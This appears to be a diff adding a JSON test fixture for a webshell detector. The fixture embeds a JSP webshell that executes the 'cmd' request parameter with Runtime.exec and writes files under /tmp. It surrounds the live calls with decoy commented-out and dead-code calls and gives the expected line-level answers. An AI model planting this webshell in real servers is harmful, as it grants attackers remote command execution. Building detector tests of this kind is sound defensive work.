@@ -1,0 +1,10 @@
+{
+ "material": "<%@ page import=\"java.io.*\" %>\n<%-- Runtime.getRuntime().exec(request.getParameter(\"old\")) --%>\n<%\nString c = request.getParameter(\"cmd\");\nString t = request.getHeader(\"X-Token\");\nString doc = \"Runtime.getRuntime().exec(c) is only documentation\";\n// new ProcessBuilder(c).start();\nif (false) {\n    Class.forName(\"x.Y\").newInstance();\n}\nProcess p = Runtime.getRuntime().exec(c);\nFileOutputStream fo = new FileOutputStream(\"/tmp/\" + t);\n%>\n",
+ "rep": "webshell",
+ "transform": "live",
+ "key": null,
+ "expected": "11:Runtime.exec,12:FileOutputStream",
+ "note": "webshell-request-primitive-model: lib.codec.webshell_model -> field 'live' (live = `line:api`, comma-joined); source ws_src/ws_jsp_stages.jsp",
+ "generator_cmd": "python3 -I tests/data/script_fixtures/ws_gen.py tests/data/script_fixtures/ws_src  (stdlib; literal shell sources)",
+ "oracle_cmd": "python3 -I tests/data/script_fixtures/ws_oracle_jsp.py tests/data/script_fixtures/ws_src/ws_jsp_stages.jsp  (javac -g + javap -c -l: bytecode invokes by LineNumberTable; javac folds if(false))"
+}
